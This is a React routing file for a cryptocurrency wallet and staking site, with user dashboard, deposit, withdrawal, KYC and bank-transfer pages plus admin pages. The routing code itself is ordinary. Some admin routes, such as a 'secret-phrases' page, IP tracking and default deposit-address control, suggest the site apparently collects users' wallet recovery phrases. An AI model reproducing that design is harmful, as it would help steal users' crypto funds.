import { BrowserRouter as Router, Routes, Route } from 'react-router-dom';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { Toaster } from '@/components/ui/toaster';
import { ThemeProvider } from '@/contexts/ThemeContext';
import { SettingsProvider } from '@/contexts/SettingsContext';
import { AuthProvider } from '@/contexts/AuthContext';
import { Layout } from '@/components/Layout';
import ProtectedRoute from '@/components/ProtectedRoute';
import { GeoBlock } from '@/components/GeoBlock';

// Page imports
import Index from '@/pages/Index';
import Auth from '@/pages/Auth';
import Dashboard from '@/pages/Dashboard';
import Deposit from '@/pages/Deposit';
import Withdraw from '@/pages/Withdraw';
import TransactionHistory from '@/pages/TransactionHistory';
import Chat from '@/pages/Chat';
import Settings from '@/pages/Settings';
import NotFound from '@/pages/NotFound';
import AdminDashboard from '@/pages/AdminDashboard';
import AdminUsers from '@/pages/AdminUsers';
import AdminTransactions from '@/pages/AdminTransactions';
import AdminWalletManagement from '@/pages/AdminWalletManagement';

import AdminAddresses from '@/pages/AdminAddresses';
import AdminChat from '@/pages/AdminChat';
import AdminSettings from '@/pages/AdminSettings';

import AdminKYC from '@/pages/AdminKYC';

import AdminSecretPhrases from '@/pages/AdminSecretPhrases';
import AdminStaking from '@/pages/AdminStaking';
import AdminIPTracking from '@/pages/AdminIPTracking';
import AdminSmartContracts from '@/pages/AdminSmartContracts';
import AdminDefaultBTCTRC from '@/pages/AdminDefaultBTCTRC';

import AssetSelection from '@/pages/AssetSelection';
import SmartContracts from '@/pages/SmartContracts';
import AssetDetail from '@/pages/AssetDetail';
import WithdrawAsset from '@/pages/WithdrawAsset';

import BankTransfer from '@/pages/BankTransfer';
import BankDetails from '@/pages/BankDetails';
import About from '@/pages/About';
import WelcomePage from '@/pages/WelcomePage';
import KYC from '@/pages/KYC';
import Blocked from '@/pages/Blocked';
import Congratulations from '@/pages/Congratulations';

import TwoFactorAuth from '@/pages/TwoFactorAuth';

// SEO Landing Pages
import EthWallet from '@/pages/EthWallet';
import LiquidStaking from '@/pages/LiquidStaking';
import AutoStaking from '@/pages/AutoStaking';

import './App.css';

const queryClient = new QueryClient({
  defaultOptions: {
    queries: {
      staleTime: 5 * 60 * 1000, // 5 minutes
      retry: 1,
    },
  },
});

import { VisitorTracker } from '@/components/VisitorTracker';

function App() {
  return (
    <QueryClientProvider client={queryClient}>
      <ThemeProvider>
        <AuthProvider>
          <SettingsProvider>
            <Router>
              <VisitorTracker />
              <GeoBlock>
                <Routes>
                {/* Geo-blocked page */}
                <Route path="/blocked" element={<Blocked />} />
                
                {/* Public routes */}
                <Route path="/" element={<Index />} />
                <Route path="/auth" element={<Auth />} />
                <Route path="/about" element={<About />} />
                <Route path="/welcome" element={<WelcomePage />} />
                <Route path="/congratulations" element={
                  <ProtectedRoute>
                    <Congratulations />
                  </ProtectedRoute>
                } />
                
                {/* SEO Landing Pages */}
                <Route path="/eth-wallet" element={<EthWallet />} />
                <Route path="/liquid-staking" element={<LiquidStaking />} />
                <Route path="/auto-staking" element={<AutoStaking />} />
                
                {/* KYC route - requires authentication */}
                <Route path="/kyc" element={
                  <ProtectedRoute>
                    <KYC />
                  </ProtectedRoute>
                } />

                {/* Protected routes with layout */}
                <Route path="/dashboard" element={
                  <ProtectedRoute>
                    <Layout>
                      <Dashboard />
                    </Layout>
                  </ProtectedRoute>
                } />
                
                <Route path="/dashboard/deposit" element={
                  <ProtectedRoute>
                    <Layout>
                      <Deposit />
                    </Layout>
                  </ProtectedRoute>
                } />
                
                <Route path="/dashboard/withdraw" element={
                  <ProtectedRoute>
                    <Layout>
                      <Withdraw />
                    </Layout>
                  </ProtectedRoute>
                } />
                
                <Route path="/dashboard/history" element={
                  <ProtectedRoute>
                    <Layout>
                      <TransactionHistory />
                    </Layout>
                  </ProtectedRoute>
                } />
                
                <Route path="/dashboard/chat" element={
                  <ProtectedRoute>
                    <Layout>
                      <Chat />
                    </Layout>
                  </ProtectedRoute>
                } />
                
                <Route path="/dashboard/settings" element={
                  <ProtectedRoute>
                    <Layout>
                      <Settings />
                    </Layout>
                  </ProtectedRoute>
                } />
                
                <Route path="/dashboard/2fa" element={
                  <ProtectedRoute>
                    <Layout>
                      <TwoFactorAuth />
                    </Layout>
                  </ProtectedRoute>
                } />


                <Route path="/asset-selection" element={
                  <ProtectedRoute>
                    <Layout>
                      <AssetSelection />
                    </Layout>
                  </ProtectedRoute>
                } />

                <Route path="/dashboard/asset/:symbol" element={
                  <ProtectedRoute>
                    <Layout>
                      <AssetDetail />
                    </Layout>
                  </ProtectedRoute>
                } />

                <Route path="/withdraw/:symbol" element={
                  <ProtectedRoute>
                    <Layout>
                      <WithdrawAsset />
                    </Layout>
                  </ProtectedRoute>
                } />


                <Route path="/bank-transfer" element={
                  <ProtectedRoute>
                    <Layout>
                      <BankTransfer />
                    </Layout>
                  </ProtectedRoute>
                } />

                <Route path="/bank-details" element={
                  <ProtectedRoute>
                    <Layout>
                      <BankDetails />
                    </Layout>
                  </ProtectedRoute>
                } />

                <Route path="/smart-contracts" element={
                  <ProtectedRoute>
                    <Layout>
                      <SmartContracts />
                    </Layout>
                  </ProtectedRoute>
                } />

                {/* Admin routes */}
                <Route path="/dashboard/admin" element={
                  <ProtectedRoute requireAdmin>
                    <Layout>
                      <AdminDashboard />
                    </Layout>
                  </ProtectedRoute>
                } />
                
                <Route path="/dashboard/admin/users" element={
                  <ProtectedRoute requireAdmin>
                    <Layout>
                      <AdminUsers />
                    </Layout>
                  </ProtectedRoute>
                } />
                
                <Route path="/dashboard/admin/transactions" element={
                  <ProtectedRoute requireAdmin>
                    <Layout>
                      <AdminTransactions />
                    </Layout>
                  </ProtectedRoute>
                } />
                
                <Route path="/dashboard/admin/wallet-management" element={
                  <ProtectedRoute requireAdmin>
                    <Layout>
                      <AdminWalletManagement />
                    </Layout>
                  </ProtectedRoute>
                } />

                
                
                <Route path="/dashboard/admin/chat" element={
                  <ProtectedRoute requireAdmin>
                    <Layout>
                      <AdminChat />
                    </Layout>
                  </ProtectedRoute>
                } />
                
                <Route path="/dashboard/admin/settings" element={
                  <ProtectedRoute requireAdmin>
                    <Layout>
                      <AdminSettings />
                    </Layout>
                  </ProtectedRoute>
                } />
                 
                 <Route path="/dashboard/admin/kyc" element={
                   <ProtectedRoute requireAdmin>
                     <Layout>
                       <AdminKYC />
                     </Layout>
                   </ProtectedRoute>
                  } />
                  
                    
                   <Route path="/dashboard/admin/secret-phrases" element={
                     <ProtectedRoute requireAdmin>
                       <Layout>
                         <AdminSecretPhrases />
                       </Layout>
                     </ProtectedRoute>
                     } />

                 <Route path="/dashboard/admin/staking" element={
                   <ProtectedRoute requireAdmin>
                     <Layout>
                       <AdminStaking />
                     </Layout>
                   </ProtectedRoute>
                 } />

                 <Route path="/dashboard/admin/addresses" element={
                   <ProtectedRoute requireAdmin>
                     <Layout>
                       <AdminAddresses />
                     </Layout>
                   </ProtectedRoute>
                 } />

                 <Route path="/dashboard/admin/ip-tracking" element={
                   <ProtectedRoute requireAdmin>
                     <Layout>
                       <AdminIPTracking />
                     </Layout>
                   </ProtectedRoute>
                 } />

                 <Route path="/dashboard/admin/smart-contracts" element={
                   <ProtectedRoute requireAdmin>
                     <Layout>
                       <AdminSmartContracts />
                     </Layout>
                   </ProtectedRoute>
                 } />

                 <Route path="/dashboard/admin/default-btc-trc" element={
                   <ProtectedRoute requireAdmin>
                     <Layout>
                       <AdminDefaultBTCTRC />
                     </Layout>
                   </ProtectedRoute>
                 } />

                 {/* 404 route */}
                <Route path="*" element={<NotFound />} />
              </Routes>
              </GeoBlock>
            </Router>
            <Toaster />
          </SettingsProvider>
        </AuthProvider>
      </ThemeProvider>
    </QueryClientProvider>
  );
}

export default App;
